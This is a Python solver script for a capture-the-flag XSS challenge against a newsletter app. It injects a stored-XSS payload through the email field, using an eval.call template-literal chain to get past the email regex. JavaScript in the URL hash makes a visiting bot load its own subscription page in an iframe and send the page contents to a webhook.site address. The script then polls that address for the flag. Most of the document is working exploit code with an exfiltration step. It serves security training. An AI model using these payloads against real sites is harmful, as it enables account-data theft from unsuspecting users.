#!/usr/bin/env python3
"""
CSCPT Newsletter - XSS Challenge Solver

Vulnerability: The /subscribe endpoint stores user input (email, first_name, last_name, address)
and renders it in a JS object literal on /subscription?uuid=<UUID>:

    let subscription = {'email': 'EMAIL', 'first_name': 'FN', 'last_name': 'LN', 'address': 'ADDR'};

The email regex allows `'`, `` ` ``, `$`, `{`, `}`, `+` — enough to break out of the single-quoted
string and inject arbitrary JS via a template-literal eval chain.

The hint payload (from the challenge author):
    eval.call`${unescape.call`${location.hash.substring`1`}`}`

This works because:
  1. location.hash.substring`1`    -> tagged-template call: substring(["1"]) -> hash without '#'
  2. unescape.call`${...}`         -> unescape(unescapedHash)
  3. eval.call`${...}`             -> eval(code)  (Function.prototype.call passes the 1st arg as code)

The "payload" JS lives in the URL fragment (after `#`) so the restrictive email regex never sees
`:`, `/`, `(`, `)`, etc. — they only appear in the hash and are decoded by unescape before eval.

The bot at :23205 visits any URL we give it with a headless Chrome. Its Flask session cookie is
HttpOnly, so we can't read it from JS, but the server resolves `/subscription` (no UUID) using
the bot's own session — returning the bot's subscription page. We load that page in an <iframe>
(a *real* navigation, not fetch — fetch returns a stripped template without the inline
`let subscription = {...}` script) and read `iframe.contentDocument.body.innerHTML`, which
contains the bot's address — and the flag.

The flag is in the bot's stored `address` field (the regex `^[a-zA-Z0-9{}., ]+$` on the address
deliberately permits `{` and `}` so the flag format CSCPT{...} can be stored there).

Usage:
    WEBHOOK="https://webhook.site/<your-token>" python3 solve.py
"""
import json
import os
import random
import re
import string
import sys
import time
import urllib.parse
import urllib.request

try:
    import requests
except ImportError:
    print("pip install requests"); sys.exit(1)

NEWSLETTER = "http://193.136.164.147:23203"
BOT        = "http://193.136.164.147:23205"
WEBHOOK    = os.environ.get("WEBHOOK", "https://webhook.site/679a9264-11cc-4472-863e-25b6288cf2e4")

# Single Session handles cookies (the Flask session cookie carries the CSRF token).
newsletter_sess = requests.Session()
bot_sess        = requests.Session()


def get_csrf():
    """GET / and pull the CSRF token. Session cookie is stored in newsletter_sess."""
    r = newsletter_sess.get(NEWSLETTER + "/")
    m = re.search(r'csrf_token" value="([^"]+)"', r.text)
    return m.group(1) if m else None


# ---------------------------------------------------------------------------
# step 1 — subscribe with the XSS email
# ---------------------------------------------------------------------------
# Break out of the JS single-quoted string and inject the eval chain.
# All chars here are within the email regex: [a-zA-Z0-9.,+'${}`]+
XSS_EMAIL = (
    "'+eval.call`${unescape.call`${location.hash.substring`1`}`}`+'@a.b"
)

# Make each run unique so we don't collide with a previously-subscribed email.
# The email input has maxlength=75, and the XSS payload is ~60 chars, so we only
# have ~11 chars of headroom for the uniqueness prefix. 8 digits of timestamp
# gives 10^8 combinations — more than enough.
import time
XSS_EMAIL = str(int(time.time()) % 10**8) + XSS_EMAIL

def subscribe(csrf):
    data = {
        "email":      XSS_EMAIL,
        "first_name": "A",
        "last_name":  "B",
        "address":    "42 St",
        "csrf_token": csrf,
    }
    r = newsletter_sess.post(NEWSLETTER + "/subscribe", data=data, allow_redirects=False)
    m = re.search(r"uuid=([0-9a-f-]+)", r.text) or re.search(r"uuid=([0-9a-f-]+)", r.headers.get("Location", ""))
    if not m:
        err = re.search(r'<p class="text-danger">([^<]+)</p>', r.text)
        raise RuntimeError(
            f"failed to subscribe: {err.group(1) if err else f'status={r.status_code}'}"
        )
    return m.group(1)


# ---------------------------------------------------------------------------
# step 2 — build the URL we give the bot
# ---------------------------------------------------------------------------
# JS payload (lives in the URL hash, only seen by eval via unescape):
#   * create an <iframe> pointing at /subscription
#       - /subscription with NO uuid uses the bot's session -> renders the bot's data
#       - this is a real navigation, so the server returns the full page including the
#         inline `let subscription = {...}` script and the populated <a id="visitor_address">
#   * after 3s, read iframe.contentDocument.body.innerHTML and exfil to webhook
#
# Note: `fetch('/subscription')` returns a *stripped* template (no inline script, empty spans).
# Only a real navigation (iframe, window.open, or top-level nav) gets the full page.
JS_PAYLOAD = (
    "var i=document.createElement('iframe');"
    "i.src='/subscription';"
    "document.body.appendChild(i);"
    "setTimeout(function(){"
      "fetch('" + WEBHOOK + "?z='+encodeURIComponent(i.contentDocument.body.innerHTML))"
    "},3000)"
)


def build_bot_url(uuid):
    return f"{NEWSLETTER}/subscription?uuid={uuid}#{urllib.parse.quote(JS_PAYLOAD)}"


# ---------------------------------------------------------------------------
# step 3 — send to bot
# ---------------------------------------------------------------------------
def submit_to_bot(url):
    r = bot_sess.post(BOT + "/check", data={"url": url})
    return r.status_code


# ---------------------------------------------------------------------------
# step 4 — poll webhook
# ---------------------------------------------------------------------------
def poll_webhook(patience=45):
    """Poll webhook.site's JSON API for the captured request."""
    token = WEBHOOK.rsplit("/", 1)[-1]
    api = f"https://webhook.site/token/{token}/requests?sorting=newest"
    deadline = time.time() + patience
    seen = set()
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(api, timeout=10) as r:
                data = json.loads(r.read())
                for req in data.get("data", []):
                    rid = req.get("uuid")
                    if rid in seen:
                        continue
                    seen.add(rid)
                    q = req.get("query") or {}
                    z = q.get("z", "")
                    if z:
                        decoded = urllib.parse.unquote(z)
                        m = re.search(r"CSCPT\{[^}]*\}", decoded)
                        if m:
                            return m.group(0)
        except Exception:
            pass
        time.sleep(3)
    return None


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    print(f"[*] webhook: {WEBHOOK}")
    print(f"[*] newsletter: {NEWSLETTER}")
    print(f"[*] bot: {BOT}")

    print("[*] step 1: GET /  (csrf + session cookie)")
    csrf = get_csrf()
    print(f"    csrf: {csrf[:30]}...")

    print("[*] step 2: POST /subscribe with XSS email")
    uuid = subscribe(csrf)
    print(f"    uuid: {uuid}")

    bot_url = build_bot_url(uuid)
    print(f"[*] step 3: bot URL length: {len(bot_url)}")
    print(f"    url: {bot_url[:120]}...")

    print("[*] step 4: POST /check -> bot")
    status = submit_to_bot(bot_url)
    print(f"    bot status: {status}")

    print("[*] step 5: poll webhook for exfiltrated /subscription body")
    flag = poll_webhook(patience=45)
    if flag:
        print(f"\n[+] FLAG: {flag}")
        return 0

    print("[-] no flag captured within patience window")
    return 1


if __name__ == "__main__":
    sys.exit(main())
